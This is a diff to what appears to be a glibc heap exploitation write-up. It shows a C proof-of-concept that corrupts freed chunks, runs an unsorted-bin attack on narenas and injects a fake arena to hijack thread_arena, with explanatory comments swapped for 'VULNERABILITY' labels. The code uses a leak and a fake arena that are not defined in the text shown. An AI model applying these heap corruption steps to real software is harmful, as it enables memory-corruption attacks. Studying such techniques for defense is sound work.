@@ -34,43 +34,33 @@ The attack leverages a minor bug in glibc related to how arenas are reused when 
 #include <assert.h>
 
 int main(void) {
-    // 1. Setup chunks to craft binmap-chunk size
     void *SMALLCHUNK = malloc(0x88);
     void *FAST20 = malloc(0x18);
     void *FAST40 = malloc(0x38);
 
-    // Bin SMALLCHUNK into smallbins to trigger mark_bin(m, i)
     free(SMALLCHUNK);
-    malloc(0x98); // Trigger binning
+    malloc(0x98); 
 
-    // Now main_arena.binmap contains a value (e.g., 0x200) that can act as a sizefield.
-    
-    // 2. Binmap Attack
-    // Use WAF to link the binmap-chunk (inside main_arena) into the unsorted bin.
     SMALLCHUNK = malloc(0x88);
     free(SMALLCHUNK);
-    *((uint64_t*) (SMALLCHUNK + 0x8)) = libc_leak + 0x7f8; // Redirect to binmap
 
-    // 3. Allocate Binmap Chunk
-    // Request a size that matches the crafted binmap size.
+    // VULNERABILITY: Redirect to binmap
+    *((uint64_t*) (SMALLCHUNK + 0x8)) = libc_leak + 0x7f8; 
+
     void *BINMAP = malloc(0x1f8);
 
-    // 4. Unsorted Bin Attack on narenas
-    // Corrupt narenas variable with a large value.
     void *INTM = malloc(0x98);
-    *((uint64_t*) (INTM + 0x8)) = libc_leak - 0xa20; // Target narenas-0x10
-    malloc(0x98); // Trigger unsorted bin attack
 
-    // 5. Inject Fake Arena
-    // Set main_arena.next to the address of our fake arena.
+    // VULNERABILITY: Unsorted bin attack on narenas
+    *((uint64_t*) (INTM + 0x8)) = libc_leak - 0xa20; 
+    malloc(0x98); 
+
+    // VULNERABILITY: Inject fake arena
     *((uint64_t*) (BINMAP + 0x8)) = (uint64_t) (fake_arena);
 
-    // 6. Hijack thread_arena
-    // Trigger reused_arena() via large/invalid allocation requests.
     malloc(0xffffffffffffffbf + 1);
     malloc(0xffffffffffffffbf + 1);
 
-    // thread_arena is now hijacked!
     return 0;
 }
 ```
